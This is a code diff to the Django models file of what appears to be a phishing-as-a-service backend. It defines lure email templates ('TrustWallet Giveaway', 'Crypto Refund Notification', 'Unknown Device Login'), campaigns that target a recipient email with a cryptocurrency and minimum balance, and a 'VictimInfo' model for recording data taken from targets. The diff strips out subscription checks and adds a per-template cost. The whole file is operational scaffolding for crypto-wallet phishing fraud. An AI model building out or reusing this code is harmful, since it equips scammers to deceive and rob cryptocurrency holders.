@@ -4,17 +4,19 @@ from django.conf import settings
 import uuid
 from django.utils import timezone
 from shortuuid.django_fields import ShortUUIDField
-from account.models import Subscription
+
 
 TEMPLATE_CHOICES = [
     ('AIRDROP', 'Airdrop Notification'),
     ('REFUND', 'Crypto Refund Notification'),
     ('GIVEAWAY', 'TrustWallet Giveaway'),
     ('UNKNOWN DEVICE LOGIN', 'Unknown Device Login'),
-
 ]
 
+
+
 User = settings.AUTH_USER_MODEL
+
 
 class Cryptocurrency(models.Model):
     code = models.CharField(max_length=10)  # e.g., BTC, ETH
@@ -28,15 +30,8 @@ class Cryptocurrency(models.Model):
         verbose_name_plural = 'Cryptocurrencies'
 
 
-
 class Wallet(models.Model):
     name = models.CharField(max_length=20, unique=True)  # e.g., TrustWallet, Coinbase
-    logo = models.ImageField(
-        upload_to='wallets/',
-        null=True,
-        blank=True,
-        verbose_name='Logo'
-    )
 
     def __str__(self):
         return self.name
@@ -45,16 +40,9 @@ class Wallet(models.Model):
         verbose_name = 'Wallet'
         verbose_name_plural = 'Wallets'
 
-
-
 class EmailTemplate(models.Model):
     type = models.CharField(max_length=20, choices=TEMPLATE_CHOICES)
-
-    def get_active_subscriptions(self):
-        return Subscription.objects.filter(
-            is_active=True,
-            end_date__gt=timezone.now()
-        )
+    xp_cost = models.DecimalField(max_digits=10, decimal_places=2, default=0)
 
     def __str__(self):
         return self.type 
@@ -68,25 +56,12 @@ class Campaign(models.Model):
     user = models.ForeignKey(User, on_delete=models.CASCADE)
     recipient_email = models.EmailField()
     email_template = models.ForeignKey(EmailTemplate, on_delete=models.CASCADE)
-    cryptocurrency = models.ForeignKey(Cryptocurrency, on_delete=models.CASCADE, null=True, blank=True, default=None)
-    quantity = models.DecimalField(max_digits=20, decimal_places=8, null=True, blank=True)
-    min_balance = models.DecimalField(max_digits=20, decimal_places=8, null=True, blank=True)
+    cryptocurrency = models.ForeignKey(Cryptocurrency, on_delete=models.CASCADE, default=None)
+    quantity = models.DecimalField(max_digits=20, decimal_places=8, default=0)
+    min_balance = models.DecimalField(max_digits=20, decimal_places=8,default=0)
     created_at = models.DateTimeField(auto_now_add=True)
+    
 
-    def has_valid_subscription(self):
-        return Subscription.objects.filter(
-            user=self.user,
-            is_active=True,
-            end_date__gt=timezone.now()
-        ).exists()
-
-    def get_monthly_usage(self):
-        return Campaign.objects.filter(
-            user=self.user,
-            email_template=self.email_template,
-            created_at__month=timezone.now().month,
-            created_at__year=timezone.now().year
-        ).count()
 
     def __str__(self):
         return f'Campaign for {self.recipient_email} - {self.cryptocurrency}'
@@ -94,7 +69,7 @@ class Campaign(models.Model):
     class Meta:
         verbose_name = 'Campaign'
         verbose_name_plural = 'Campaigns'
-        ordering = ['-created_at']
+
 
 class VictimInfo(models.Model):
     id = ShortUUIDField(unique=True, max_length=12, length=3, prefix='CL', alphabet='0123456789', primary_key=True)
